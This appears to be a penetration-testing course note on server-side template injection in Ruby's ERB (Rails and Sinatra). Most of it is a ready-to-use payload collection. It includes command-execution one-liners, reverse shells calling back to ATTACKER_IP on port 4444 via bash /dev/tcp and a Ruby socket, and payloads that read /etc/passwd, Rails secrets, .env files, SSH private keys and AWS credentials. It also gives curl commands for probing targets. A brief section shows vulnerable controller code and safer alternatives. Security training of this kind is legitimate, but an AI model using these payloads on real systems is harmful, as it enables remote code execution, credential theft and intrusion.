---
tags: [vapt, ssti, advanced]
difficulty: advanced
module: "09 - SSTI"
topic: "09.07 SSTI in ERB (Ruby on Rails)"
---

# 09.07 — SSTI in ERB (Ruby on Rails)

## ERB Basics

ERB (Embedded Ruby) is the default template engine in Ruby on Rails. It allows executing arbitrary Ruby code inside `<%= %>` tags — making SSTI in ERB immediately equivalent to full Ruby code execution.

```ruby
# NORMAL ERB SYNTAX:
<%= expression %>    → evaluates and outputs
<%  code %>          → evaluates (no output)
<%# comment %>       → comment

# DETECTION:
<%= 7*7 %>   → 49 = ERB confirmed!
<%= 1+1 %>   → 2
<%= "hello".upcase %>  → HELLO

# WHY ERB IS POWERFUL:
# <%= %> executes ARBITRARY RUBY CODE!
# No class traversal needed like Jinja2!
# Direct access to Ruby's system execution methods:
<%= system('id') %>
<%= `id` %>        ← Ruby backtick = OS command!
```

---

## ERB RCE Payloads

```ruby
# SYSTEM CALL (prints to stdout but returns true/false in HTML):
<%= system('id') %>

# BACKTICK (returns output as string — appears in HTML!):
<%= `id` %>
<%= `cat /etc/passwd` %>
<%= `whoami` %>
<%= `hostname` %>
<%= `ls /var/www/rails` %>

# IO.POPEN (returns output):
<%= IO.popen('id').read %>
<%= IO.popen('cat /etc/passwd').read %>

# POPEN3 (more control):
require 'open3'
stdin, stdout, stderr = Open3.popen3('id')
stdout.read

# %X[] SYNTAX:
<%= %x[id] %>
<%= %x[cat /etc/passwd] %>

# PROCESS.SPAWN:
<%= Process.spawn('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') %>

# KERNEL.EXEC (replace current process — no output to HTTP):
<%= exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') %>
```

---

## Reading Files in ERB

```ruby
# FILE.READ:
<%= File.read('/etc/passwd') %>
<%= File.read('/var/www/rails/config/database.yml') %>  ← database credentials!
<%= File.read('/var/www/rails/config/secrets.yml') %>   ← secret_key_base!
<%= File.read('/var/www/rails/.env') %>                  ← environment variables!
<%= File.read(Dir.home + '/.ssh/id_rsa') %>              ← SSH private key!

# LIST DIRECTORY:
<%= Dir.entries('/') %>
<%= Dir.entries('/var/www/rails').inspect %>

# FIND FILES:
<%= Dir.glob('/var/www/**/*.key').inspect %>
<%= Dir.glob('/home/**/.ssh/*').inspect %>
```

---

## Ruby-Specific Data Access

```ruby
# RAILS/RUBY ENVIRONMENT:
<%= ENV.inspect %>               → all environment variables!
<%= ENV['DATABASE_URL'] %>       → database connection string!
<%= ENV['SECRET_KEY_BASE'] %>    → Rails secret key!
<%= ENV['AWS_ACCESS_KEY_ID'] %>  → AWS credentials!
<%= Rails.application.credentials.secret_key_base %>  ← if Rails in scope

# RUBY VERSION INFO:
<%= RUBY_VERSION %>
<%= RUBY_PLATFORM %>

# RUNNING PROCESSES:
<%= `ps aux` %>
<%= `netstat -tulpn 2>/dev/null || ss -tulpn` %>

# CURRENT USER:
<%= `whoami` %>
<%= Process.uid %>
<%= Process.gid %>
```

---

## Reverse Shell via ERB

```ruby
# METHOD 1 — BASH:
<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` %>

# METHOD 2 — RUBY SOCKET:
<%= require 'socket'; s = TCPSocket.new('ATTACKER_IP', 4444); while(cmd = s.gets.chomp); IO.popen(cmd) {|io| s.print io.read}; end %>

# METHOD 3 — FORK:
<%= fork { exec "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" } %>
# fork = child process → doesn't disrupt the HTTP response!

# METHOD 4 — SPAWN:
<%= Process.spawn("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") %>
```

---

## ERB Context in Rails

```ruby
# RAILS CONTROLLER SSTI SCENARIO:
# app/controllers/pages_controller.rb

class PagesController < ApplicationController
  def show
    # VULNERABLE: user input in template string
    @message = params[:message]
    ERB.new(@message).result(binding)  # → SSTI!
  end
end

# SAFER VERSIONS:
# Just pass as variable:
render 'show', message: params[:message]  # Safe if template uses <%= h @message %>
# Use html_escape explicitly in template:
<%= h @message %>   ← h() = HTML escape, prevents XSS, but NOT SSTI
# The issue is ERB.new(user_input).result() — never do this!

# ALSO VULNERABLE:
eval(params[:code])  # But this is template injection via eval, not ERB specifically
```

---

## Sinatra (Non-Rails Ruby)

```ruby
# SINATRA ALSO USES ERB:
# app.rb:
get '/greet' do
  name = params[:name]
  erb "Hello #{name}!"  # VULNERABLE! User input in template string
end

# INJECT:
?name=<%= `id` %>
→ Response: Hello uid=33(www-data)...
```

---

## Detection

```bash
# DETECT ERB:
curl -s "https://target.com/?name=%3C%25%3D+7*7+%25%3E" | grep "49"
# <%= 7*7 %> URL-encoded

# RCE CHECK:
curl -s "https://target.com/?name=%3C%25%3D+%60id%60+%25%3E"
# <%= `id` %> URL-encoded

# FILE READ:
curl -s "https://target.com/?name=%3C%25%3D+File.read%28%27%2Fetc%2Fpasswd%27%29+%25%3E"
# <%= File.read('/etc/passwd') %> URL-encoded
```

---

## Related Notes
- [[03 - Detecting SSTI]] — detection methodology
- [[04 - SSTI in Jinja2]] — Python equivalent
- [[08 - SSTI to RCE Escalation]] — escalation guide
- [[11 - Reverse Shell Payloads]] — reverse shell reference
- [[10 - SSTImap Tool Usage]] — automated exploitation
